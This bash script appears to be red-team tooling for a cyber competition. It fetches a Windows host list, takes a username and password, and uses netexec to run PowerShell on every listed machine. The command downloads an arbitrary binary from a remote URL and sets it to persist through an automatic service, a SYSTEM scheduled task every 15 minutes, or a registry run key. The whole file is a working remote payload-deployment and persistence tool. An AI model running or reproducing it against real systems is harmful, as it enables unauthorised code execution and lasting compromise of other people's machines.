#!/bin/bash

# Download hosts file
curl https://raw.githubusercontent.com/CyberLions/fortnite-the-video-game-parenthesis-the-town-parenthesis/main/hosts/windows.txt -o windowsHosts.txt

deploy()
{
    read -p "Where is the binary stored: " binary
    echo "Is the folder where you want to store the binary already on the filesystem"
    echo "1. Yes"
    echo "2. No"
    read -p "Yes or No: " create
    case $create in 
        1)
            execute "false" "$binary"
            ;;
        2)
            execute "true" "$binary"
            ;;
    esac

}

execute()
{
    local createFolder=$1
    local binary=$2
    read -p "What user are you signing in as: " userName
    read -p "User password: " userPass
    read -p "Where do you want to drop the binary: " binPath
    read -p "What do you want to name the binary: " binName
    fullPath="$binPath\\$binName"
    echo "Persistence Methods: " 
    echo "1. Service"
    echo "2. Scheduled Task"
    echo "3. Registry Key"
    read -p "Which persistence method do you want to use: " persistMethod
    case $persistMethod in 
        1)
            read -p "What do you want to name the service: " serviceName
            read -p "What description do you want to use for the service: " serviceDescription
            persist="New-Service -Name '$serviceName' -BinaryPathName '$fullPath' -DisplayName '$serviceName' -Description '$serviceDescription' -StartupType Automatic; 
            Start-Service -Name '$serviceName';"
            ;;
        2)
            read -p "What do you want to name the scheduled task: " taskName
            read -p "What description do you want to set for the task: " taskDescription
            persist="schtasks /create /sc minute /mo 15 /tn '$taskName' /tr '$fullPath' /ru 'SYSTEM'; 
            schtasks /change /tn '$taskName' /description '$taskDescription'"
            ;;
        3) 
            read -p "Registry Path?: " regPath
            read -p "Registry Key?: " regKey
            echo "Do you want to preserve any key values that may exist within the path?: "
            echo "1. Yes"
            echo "2. No"
            read -p "Yes or No: " preserveKeys
            case $preserveKeys in 
                1)
                    read -p "Please enter the pre-existing key values, followed by a comma: " existingValue
                    persist="reg add '$regPath' /v '$regKey' /d '$existingValue,$fullPath' /t reg_sz /f;" 
                    ;;
                2)
                    persist="reg add '$regPath' /v '$regKey' /d '$fullPath' /t reg_sz /f;"
                    ;;
            esac
    esac
    
    local command="Invoke-WebRequest -Uri '$binary' -OutFile '$fullPath'; $persist"
    if [[ $createFolder == "true" ]]; then
        command="mkdir '$binPath'; $command"
    fi
    netexec windowsHosts.txt -u "$userName" -p "$userPass" -X "$command"
}

main()
{
    deploy
}

main
